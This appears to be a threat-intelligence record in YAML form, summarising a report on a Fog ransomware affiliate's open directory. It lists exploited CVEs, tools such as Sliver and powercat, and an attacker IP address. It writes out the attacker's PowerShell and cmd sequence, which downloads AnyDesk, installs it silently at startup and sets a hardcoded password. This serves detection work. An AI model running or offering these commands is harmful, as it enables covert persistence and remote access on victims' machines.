title: Navigating Through The Fog
description: An open directory associated with a ransomware affiliate, likely linked
  to the Fog ransomware group, was discovered in December 2024. It contained tools
  and scripts for reconnaissance, exploitation, lateral movement, and persistence.
attribution: ''
malware_families: []
cves:
- CVE-2020-1472
- CVE-2021-42278
- CVE-2021-42287
ttps:
  processes:
  - AnyDesk.exe
  - netextender
  - cmd.exe
  - C:\ProgramData\AnyDesk.exe
  - sliver-client_linux
  - powercat.ps1
  command_lines:
  - netextender <target IP address> username <target username> password <username
    password> domain <target domain name> always-trust .
  - cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win
    --silent
  - cmd.exe /c echo Admin#123 | C:\ProgramData\anydesk.exe --set-password
  - cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
  powershell:
  - mkdir "C:\ProgramData\AnyDesk"
  - $clnt = new-object System.Net.WebClient
  - $url = "http://download.anydesk.com/AnyDesk.exe"
  - $file = "C:\ProgramData\AnyDesk.exe"
  - $clnt.DownloadFile($url,$file)
  - cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win
    --silent
  - cmd.exe /c echo Admin#123 | C:\ProgramData\anydesk.exe --set-password
  - cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
  scripts:
  - sonic_scan/main.py
  - any.ps1
  - powercat.ps1
  registry_keys: []
  image_loads: []
  network_connections:
  - AnyDesk.exe -> 194.48.154.79:31337
